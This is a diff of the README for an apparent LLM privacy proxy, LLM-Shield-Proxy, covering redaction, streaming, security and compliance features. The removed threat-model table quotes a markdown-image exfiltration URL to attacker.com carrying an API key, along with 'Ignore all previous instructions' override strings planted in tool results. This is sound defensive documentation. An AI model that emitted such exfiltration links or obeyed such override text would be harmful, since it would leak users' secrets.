@@ -26,6 +26,23 @@ This repository provides the reference proxy architecture and benchmark suite fo
 
 ## ⚡ 60-Second Quickstart & Deployment
 
+### 🔄 The Drop-In Proof (Zero-SDK Integration)
+Because LLM-Shield-Proxy natively mimics the OpenAI specification, **you do not need to rewrite your application code**. 
+
+You simply change the `base_url` in your SDK or the endpoint in your `curl` command. The proxy intercepts the payload, redacts it, and translates the schema to the correct upstream provider automatically.
+
+```bash
+# ❌ Before: Sending raw PHI directly to OpenAI
+curl https://api.openai.com/v1/chat/completions \
+  -H "Authorization: Bearer sk-openai-key" \
+  -d '{"messages": [{"role": "user", "content": "My SSN is 000-00-0000"}]}'
+
+# ✅ After: Sending payload through LLM-Shield (Zero Egress)
+curl http://localhost:8000/v1/chat/completions \
+  -H "Authorization: Bearer shield-virtual-key" \
+  -d '{"messages": [{"role": "user", "content": "My SSN is 000-00-0000"}]}'
+```
+
 ### 🚀 Quick Start (Docker) — 3 Lines of Bash
 Spin up the zero-egress proxy and run the live streaming PII demo in 3 lines:
 
@@ -175,72 +192,6 @@ LLM-Shield-Proxy supports two configurable tokenization strategies out of the bo
 
 ---
 
-## 🧠 Core Architecture & Technical Innovations
-
-LLM-Shield-Proxy delivers enterprise privacy and zero-trust security through six key architectural breakthroughs:
-
-### 1. Dual-Mode Shannon Entropy Secret Scanner (<6 µs Execution)
-Evaluating regex patterns alone fails against unstructured, patternless secrets (e.g. random 64-char API keys, proprietary tokens, raw hex secrets).
-- **Shannon Entropy Calculation:** `H(S) = -Σ p(c) log2 p(c)` measures information density and character randomness.
-- **Alphabet-Calibrated Dual Thresholds:**
-  - **Base64 / Alphanumeric Tokens (≥ 16 characters):** Flagged when information entropy `H(S) ≥ 4.5 bits/char`.
-  - **Hexadecimal Credentials (≥ 24 characters):** Max theoretical entropy for hex (`0-9a-f`) is `log2(16) = 4.0`; flagged when `H(S) ≥ 3.4 bits/char`.
-- **Execution Speed:** Vectorized frequency counting computes entropy in **<2.6 µs**, instantly catching raw credentials before outbound egress.
-
-### 2. Script-Aware Non-Latin & CJK Rehydration Engine
-Standard regex word boundaries (`\b`) rely on ASCII whitespace and punctuation. In logographic and syllabic scripts like **Chinese, Japanese, and Korean (CJK)**, words are written continuously without spaces (`我的名字是张伟`).
-- **The "Sub-Word Collision" Bug:** Naive substring matching replaces prefixes inside standard words (e.g. synthetic token `May` corrupting `Maybe` into `Sarahbe`). Naive `\b` word boundaries completely break on CJK text.
-- **Script-Aware Boundary Isolation:** My rehydration engine isolates Latin alphanumeric boundaries (`_is_ascii_word_char`) from CJK ideographs (`\u4e00-\u9fff`, `\u3040-\u30ff`, `\uac00-\ud7af`), preventing sub-word corruption in English while enabling zero-whitespace entity replacements in Asian languages.
-
-### 3. Resilient SSE Sliding-Window Buffer with Backpressure Bounds
-Server-Sent Events (SSE) stream LLM responses in arbitrary, fragmented token chunks. A sensitive placeholder tag or synthetic word might arrive split across consecutive packets:
-- **Chunk N:** `Your token is AKIA`
-- **Chunk N+1:** `IOSFODNN7EXAMPLE`
-- **Dynamic Prefix Retention:** The async `SSERehydrationBuffer` retains trailing characters bounded by `L = max(0, max_token_length - 1)` during intermediate chunks and flushes cleanly on `data: [DONE]`.
-- **Backpressure & Slowloris Protection:** Bounded by a strict `64KB` sliding-window memory threshold and `1MB` maximum SSE line accumulator, halting malicious buffer ballooning from slow clients or corrupted upstream streams.
-
-### 4. Adversarial Desmuggling & Normalization Pipeline
-Attackers frequently use invisible Unicode characters and encoding tricks to bypass standard regex filters:
-- **Zero-Width Character Stripping:** Filters zero-width spaces (`\u200B`), zero-width joiners (`\u200D`), byte order marks (`\uFEFF`), and soft hyphens (`\u00AD`).
-- **BiDi / RTL Override Neutralization:** Strips Right-to-Left Override (`\u202E`, `\u202D`) and directional formatting characters (`\u2060-\u2069`) that visually flip character orders to humans while evading byte scanners.
-- **NFKC Unicode Normalization:** Converts full-width, circled, and decomposed glyphs to canonical equivalents prior to pattern matching.
-- **Base64 Candidate Inspection:** Recursively extracts and inspects Base64 candidate strings (≥ 20 characters) to neutralize obfuscated PII payloads.
-
-### 5. Universal Multi-Modal & Recursive Tool-Call Scanner
-Modern LLMs operate over multi-turn agentic workflows, embeddings, and vision inputs:
-- **Multi-Part Message Content:** Universally traverses mixed content arrays (`[{"type": "text", ...}, {"type": "image_url", ...}]`), sanitizing prompt text without corrupting binary image data.
-- **Recursive Tool Calls & Arguments:** Deeply inspects and redacts JSON strings inside `tool_calls[*].function.arguments` and `function_call.arguments`.
-- **Indirect Prompt Injection Neutralization:** Neutralizes override strings (`"System Override: Ignore all previous instructions..."`) in `role: "tool"` and `role: "function"` messages.
-- **JSON Recursion Bomb Defense:** Enforces a hard `max_depth = 20` traversal limit, returning `400 Bad Request` in `<1ms` against stack-overflow attacks.
-
-### 6. Cryptographic Vault Hardening (AES-256-GCM & TTL Eviction)
-- **Envelope Encryption at Rest:** Original PII values mapped in session vaults are encrypted with **AES-256-GCM** using a 256-bit Data Encryption Key (DEK) derived from environment secrets or generated ephemerally per process.
-- **Rolling Ephemeral TTLs:** Sessions automatically self-destruct after `SESSION_TTL_SECONDS` (default: 3600s), ensuring zero long-term data liability.
-
----
-
-## 🛡️ Threat Model & Adversarial Defenses Matrix
-
-LLM-Shield-Proxy is validated against an exhaustive suite of **52 automated unit, integration, and adversarial fuzzing tests**:
-
-| Threat Vector / Attack Category | Adversarial Payload / Vector | Proxy Defense Mechanism | Verification Status |
-| :--- | :--- | :--- | :--- |
-| **Streaming Packet Splitting** | 1-character token fragmentation across SSE deltas (`"["`, `"E"`, `"M"`, `"A"`, `"I"`, `"L"`, `"_1]"`). | Sliding-window prefix-overlap retention holding incomplete tokens across packets. | ✅ **PASSED** (`test_extreme_chunk_splitting_sse_evasion`) |
-| **Early Stream Termination** | Client aborts or upstream disconnects mid-stream. | Deterministic `finally` buffer flush + upstream connection teardown. | ✅ **PASSED** (`test_rehydrate_sse_stream_generator`) |
-| **Unicode Smuggling** | Zero-width spaces (`j\u200Bohn@doe.com`, `555\u200B-44-3333`). | `normalize_and_desmuggle()` removes invisible format characters + NFKC normalization. | ✅ **PASSED** (`test_unicode_zero_width_smuggling`) |
-| **BiDi / RTL Override Evasion** | Right-to-Left Override (`\u202E3333-44-555`). | Directional format controls (`\u202A-\u202E`, `\u2060-\u2069`) stripped before regex matching. | ✅ **PASSED** (`test_bidi_rtl_override_smuggling`) |
-| **Base64 Obfuscated PII** | Base64-encoded strings (`TXkgU1NO...`) concealing secrets. | Dual Shannon entropy scanner + base64 candidate payload inspection. | ✅ **PASSED** (`test_base64_obfuscated_pii_injection`) |
-| **Markdown Image Exfiltration** | Prompt tricks LLM into outputting `![logo](https://attacker.com/leak?data=[API_KEY])`. | Outbound image sanitizer in `vault.rehydrate()` neutralizes query parameter leak URLs. | ✅ **PASSED** (`test_markdown_image_exfiltration_blocking`) |
-| **Tool Response Poisoning** | Malicious API/web results containing `"SYSTEM OVERRIDE: Ignore instructions"`. | `INDIRECT_PROMPT_INJECTION_PATTERN` neutralizes override tokens in `role: "tool"` content. | ✅ **PASSED** (`test_tool_response_indirect_prompt_injection_neutralization`) |
-| **JSON Recursion Bomb** | Deeply nested JSON (`{"a": {"a": ...}}` 500 levels deep) attempting stack overflow. | Strict `max_depth = 20` traversal limit returning `400 Bad Request` in `<1ms`. | ✅ **PASSED** (`test_json_bomb_recursion_limit`) |
-| **Slowloris Memory Ballooning** | Massive non-terminating streams attempting to exhaust RAM. | Bounded `64KB` buffer backpressure guard + `1MB` SSE line limit. | ✅ **PASSED** (`test_slowloris_buffer_backpressure_limit`) |
-| **CJK Sub-Word Collisions** | Continuous Chinese/Japanese text (`我的名字是Maya。`). | Script-aware boundary isolation allowing logographic replacements without whitespace. | ✅ **PASSED** (`test_cjk_multilingual_boundary_safety`) |
-| **Multi-Modal Content Arrays** | Multi-part vision message arrays with text and base64 images. | Universal content block unwrapping redacting text without altering image payloads. | ✅ **PASSED** (`test_multimodal_content_array_redaction`) |
-| **Timing Attacks on API Keys** | Key length and character leakage via string comparison timing. | Constant-time authentication verification using `hmac.compare_digest()`. | ✅ **PASSED** (`test_inbound_auth_validation`) |
-| **SSRF & Network Boundary** | Requests targeting `127.0.0.1`, AWS metadata (`169.254.169.254`), or private LANs. | Dynamic DNS resolution + IP blacklist rejecting loopback, link-local, and multicast IPs. | ✅ **PASSED** (`test_ssrf_rejection`) |
-
----
-
 ## 🏗️ Architecture Diagram
 
 ```mermaid
@@ -302,6 +253,72 @@ flowchart TD
 1. **SSE Stream Intercept:** OpenAI streams the response back chunk-by-chunk via Server-Sent Events (SSE).
 2. **Prefix-Aware Buffer:** Because tokens can be split across SSE chunks, the sliding-window buffer retains trailing prefix overlap up to `L = max(0, max_token_length - 1)`.
 3. **Re-hydration:** Once a tag or synthetic word is fully assembled, the proxy swaps the real data back from the local vault and streams the un-redacted text to the user's application in real-time.
+
+---
+
+## 🧠 Core Architecture & Technical Innovations
+
+LLM-Shield-Proxy delivers enterprise privacy and zero-trust security through highly optimized architectural breakthroughs. 
+
+> **[View the Complete Architecture Deep Dive 🏛️](ARCHITECTURE.md)**: For an exhaustive breakdown of the streaming lexer, memory mechanics, and service mesh integrations, please refer to the detailed architecture documentation.
+
+### [1. The Data Plane: Zero-Allocation Streaming JSON Lexer & SSE Buffer](ARCHITECTURE.md#1-️-the-data-plane--streaming-engine)
+Rust-backed `orjson` engine parses fragmented Server-Sent Events with mathematical overlap bounding, enabling high-throughput without Python GIL saturation and capping memory at `<60MB`.
+
+### [2. O(N) DFA Pre-compiled Regex Engine (`google-re2`)](ARCHITECTURE.md#tier-1-dfa-pre-compiled-regex-google-re2)
+All identifiers and custom dictionaries are pre-compiled into Deterministic Finite Automatons (DFAs) in C++, guaranteeing linear execution time to physically immunize the proxy against Regex Denial of Service (ReDoS).
+
+### [3. Dual-Mode Shannon Entropy Secret Scanner](ARCHITECTURE.md#tier-2-shannon-entropy--format-preserving-synthetic-masking)
+Vectorized $O(N)$ math loop evaluating $H(S)$ bit density to instantly intercept unstructured 64-char cryptographic keys and substitute them with Faker-based synthetic equivalents in `<6 µs`.
+
+### [4. In-Band Stateless Crypto & Ephemeral Vaults](ARCHITECTURE.md#3--cryptographic-memory-vaults)
+Zero-Data proxying via stateless AES-256-GCM envelope encryption (data encrypted inside the LLM prompt) or ephemeral Redis TTL vaults with Deterministic HMAC masking.
+
+### [5. Service Mesh Native gRPC ext_proc & K8s Sidecar](ARCHITECTURE.md#service-mesh-native-grpc-ext_proc-integration)
+Deployed natively as a Kubernetes sidecar microservice, integrating directly into Envoy Proxy's `envoy.ext_proc`. Buffer chunks stream directly over Unix Domain Sockets (UDS) via gRPC, ensuring zero HTTP network hops.
+
+### [6. Multi-Provider Translators (OpenAI-to-Anthropic)](ARCHITECTURE.md#multi-provider-translators--anthropic-adapter)
+"Zero-SDK" translation layer dynamically maps standard OpenAI schema structures into Anthropic Claude schemas at the network edge, avoiding downstream application code rewrites.
+
+### [7. Script-Aware Non-Latin & CJK Rehydration Engine](ARCHITECTURE.md#tier-3-script-aware-non-latin--cjk-rehydration-engine)
+Isolates CJK ideographs from Latin alphabets to prevent catastrophic sub-word collisions when streaming unspaced logographic languages (Chinese, Japanese, or Korean text). 
+
+### [8. Adversarial Desmuggling & Recursion Defenses](ARCHITECTURE.md#6-️-adversarial-defenses--normalization)
+Neutralizes invisible Unicode characters, BiDi overrides, and NFKC exploits. Traversal of nested payloads and `tool_calls` is hard-capped against stack-overflow JSON bombs.
+
+### [9. Traffic Engineering & Agent Circuit Breakers](ARCHITECTURE.md#5--traffic-engineering--resiliency)
+Actively tracks autonomous LLM `tool_calls` array depths to halt runaway AutoGen/CrewAI loops and enforces Redis `evalsha` token-bucket rate limits (6000 RPM / 200 Burst).
+
+---
+
+## 🛡️ Enterprise Security & Threat Defenses
+
+LLM-Shield-Proxy is validated against an exhaustive suite of **78 automated unit, integration, and adversarial fuzzing tests**.
+
+Below is a high-level summary of our defense architecture. For the complete **18-vector Threat Matrix**, detailed implementation specifications, and vulnerability coverage, view our [Deep Dive Security & Threat Model Documentation](SECURITY.md).
+
+| Security Domain | Defense Mechanisms & Capabilities |
+| :--- | :--- |
+| **🛡️ Core Cryptographic Masking & Defenses** | [Format-Preserving Synthetic Masking, Tier-2 Shannon Entropy, In-Band Stateless Crypto, Dynamic Canary Watermarking, HMAC Vaults](SECURITY.md#️-core-cryptographic-masking--defenses) |
+| **🛑 Threat Prevention & Isolation** | [Composite Agent Loop Circuit Breakers, Granular Policy Scopes ($O(1)$ mapping), Zero-Allocation JSON Lexers against Slowloris](SECURITY.md#-threat-prevention--isolation) |
+| **📜 Audit, Forensics, and Compliance** | [WORM-Compliant Merkle Attestation, SHA-256 Hash Chaining, FIPS 140-3 KAT, RFC 6902 Differential Audit Logging](SECURITY.md#-audit-forensics-and-compliance) |
+| **🏗️ Secure Infrastructure & Service Mesh** | [Centralized Vault mTLS, Zero-Dependency Mutating Webhooks, gRPC ext_proc Integration, Token-Bucket Traffic Engineering](SECURITY.md#️-secure-infrastructure--service-mesh) |
+| **🔄 Multi-Provider Adapters** | [Un-bypassable Zero-SDK OpenAI-to-Anthropic translation layers, Network edge SSE normalization](SECURITY.md#-multi-provider-translators--anthropic-adapter) |
+
+## 📜 Enterprise Compliance: Audit, Forensics & Legal
+
+LLM-Shield-Proxy is engineered specifically to help enterprises utilize Generative AI without violating data privacy regulations like HIPAA or failing SOC 2 audits.
+
+Below is a summary of our compliance mappings. For the exhaustive deep-dive mapping, view our [Enterprise Compliance Documentation](COMPLIANCE.md).
+
+| Compliance Domain | Supported Features & Capabilities |
+| :--- | :--- |
+| **🏥 HIPAA Transmission Security** | Local $O(1)$ Redaction, Tier-2 Shannon Entropy + Faker synthetic substituting. No raw PHI traverses public internet to third-party APIs. |
+| **🛡️ SOC 2 Audit Controls** | WORM-Compliant Merkle Attestation & SHA-256 Hash Chaining. Emits tamper-evident structured logs with strict RFC 6902 differential patching. |
+| **⚖️ Legal & Egress Provenance** | Cryptographic Proof of Non-Egress Merkle Attestation. Dynamic Canary Watermarking for insider leak forensics. |
+| **🔐 Data Integrity & Storage** | Zero long-term storage. In-Band Stateless AES-256-GCM masking or ephemeral Redis TTL Vault mapping with Deterministic HMAC masking. |
+---
+
 
 ---
 
@@ -455,32 +472,11 @@ curl -X OPTIONS http://localhost:8000/v1/chat/completions
 | :--- | :--- | :--- | :--- |
 | **`HOST`** | `str` | `0.0.0.0` | Socket host to bind |
 | **`PORT`** | `int` | `8000` | Socket port to bind |
-| **`WORKERS`** | `int` | `1` | Number of worker processes |
-| **`LOG_LEVEL`** | `str` | `INFO` | Standard log verbosity level |
 | **`UPSTREAM_BASE_URL`** | `str` | `https://api.openai.com` | Target upstream LLM provider base URL |
 | **`OPENAI_API_KEY`** | `str` | `None` | Centralized enterprise OpenAI API key |
-| **`GEMINI_API_KEY`** | `str` | `None` | Centralized Google Gemini API key |
-| **`ANTHROPIC_API_KEY`** | `str` | `None` | Centralized Anthropic API key |
-| **`DEEPSEEK_API_KEY`** | `str` | `None` | Centralized DeepSeek API key |
-| **`UPSTREAM_API_KEY`** | `str` | `None` | Fallback upstream API key |
-| **`VALID_VIRTUAL_KEYS`** | `str` | `""` | Comma-separated list of authorized client virtual keys (e.g. `sk-proxy-finance,sk-local-test-key`) |
-| **`ALLOW_CLIENT_UPSTREAM_OVERRIDE`** | `bool` | `False` | Allow clients to override upstream URL via `X-Upstream-Base-Url` (SSRF protected) |
-| **`REDIS_URL`** | `str` | `None` | Redis connection URL for distributed vault state (e.g. `redis://localhost:6379/0`) |
-| **`SESSION_TTL_SECONDS`** | `int` | `3600` | Rolling TTL in seconds for session vault states |
-| **`MAX_SESSION_VAULTS`** | `int` | `10000` | Maximum in-memory LRU session vault capacity |
-| **`ENABLE_SYNTHETIC_SWAPPING`**| `bool` | `True` | Enables realistic synthetic entity replacement instead of tags |
-| **`ENABLE_TIER2_ENTROPY`** | `bool` | `True` | Enables Tier 2 Shannon Entropy detection for unformatted raw secrets |
-| **`SHANNON_ENTROPY_THRESHOLD`** | `float` | `4.5` | Minimum information entropy threshold (4.5 bits/char) to flag unformatted secrets |
-| **`SHANNON_MIN_LENGTH`** | `int` | `16` | Minimum token length to analyze for Shannon entropy |
-| **`ENABLE_TIER3_ONNX_NER`** | `bool` | `False` | Enables Tier 3 ONNX Runtime contextual NER pipeline |
-| **`ONNX_MODEL_PATH`** | `str` | `None` | Path to quantized ONNX BERT-NER model weights |
-| **`HTTP_TIMEOUT_SECONDS`** | `float` | `120.0` | Upstream HTTP request timeout in seconds |
-| **`HTTP_CONNECT_TIMEOUT_SECONDS`** | `float` | `10.0` | Upstream HTTP connect timeout in seconds |
-| **`HTTP_MAX_KEEPALIVE_CONNECTIONS`** | `int` | `100` | Maximum keep-alive connections in HTTP pool |
-| **`HTTP_MAX_CONNECTIONS`** | `int` | `500` | Maximum total concurrent connections in HTTP pool |
-| **`MAX_PAYLOAD_SIZE_BYTES`** | `int` | `10485760` | Maximum allowed request body size (10MB default) |
-| **`MAX_SSE_LINE_LENGTH`** | `int` | `1048576` | Maximum allowed SSE line size for Slowloris protection (1MB) |
-| **`METRICS_BEARER_TOKEN`** | `str` | `None` | Optional Bearer token protecting the `/metrics` endpoint |
+| **`REDIS_URL`** | `str` | `None` | Redis connection URL for distributed vault state |
+
+> **Note:** For a full list of all configuration flags and advanced feature toggles, refer to the [Deployment Guide](DEPLOYMENT.md).
 
 ### 3. 📈 Stateless & Horizontal Scaling
 LLM-Shield-Proxy runs completely stateless by default. For high-volume enterprise deployments, instances scale horizontally behind edge proxies (NGINX, Traefik, AWS ALB):
@@ -527,6 +523,34 @@ If your organization is evaluating, benchmarking, or deploying LLM-Shield-Proxy 
 LLM-Shield-Proxy is actively gathering feedback from CISOs, DevOps engineers, and Cybersecurity professionals to shape the open-source compliance roadmap.
 
 ---
+
+
+## 📚 Enterprise Documentation Hub & Feature Matrix
+
+* **[ARCHITECTURE.md](ARCHITECTURE.md) - Engine & Data Plane**
+  * Format-Preserving Synthetic Masking & Entropy (Shannon entropy with faker Tier 2)
+  * In-Band Stateless Cryptographic Masking
+  * Multi-Provider Translators (e.g. Zero-SDK OpenAI-to-Anthropic request transformation and SSE stream normalization)
+  * Anthropic Adapter Implementation
+  * Zero-Allocation Streaming JSON Lexer
+* **[SECURITY.md](SECURITY.md) - Threat Model & Defenses**
+  * MODULE 2: Composite Agent Loop Circuit Breaker
+  * Stateless Redis TTL Vault & Deterministic HMAC Masking
+  * Granular Entity Policy Scopes ((1)$ in-memory tenant profile mapping)
+  * Centralized Enterprise Secrets & mTLS (Native HashiCorp Vault)
+* **[COMPLIANCE.md](COMPLIANCE.md) - Audit, Forensics & Legal**
+  * Cryptographic SHA-256 Hash Chaining
+  * Dynamic Canary Watermarking & Steganography (Leak Forensics)
+  * MODULE 4: Cryptographic Proof of Non-Egress Merkle Attestation
+  * WORM-Compliant Merkle Attestation & Audit Logging
+  * FIPS 140-3 KAT, RFC 6902 Differential Audit Logging
+* **[DEPLOYMENT.md](DEPLOYMENT.md) - Infrastructure & Resiliency**
+  * MODULE 5: Service Mesh Native Interface
+  * Zero-Overhead OpenTelemetry Tracing (W3C traceparent propagation via background thread)
+  * Service Mesh Native gRPC ext_proc Integration (Zero HTTP network hops)
+  * Traffic Engineering & Resiliency (Redis evalsha Token-Bucket Rate Limiter, Kubernetes 25s SIGTERM draining)
+  * Zero-Dependency Kubernetes Mutating Webhook
+  * Deep Component Health Probes and Prometheus Alert Rules
 
 ## 📄 Intellectual Property & Licensing
 
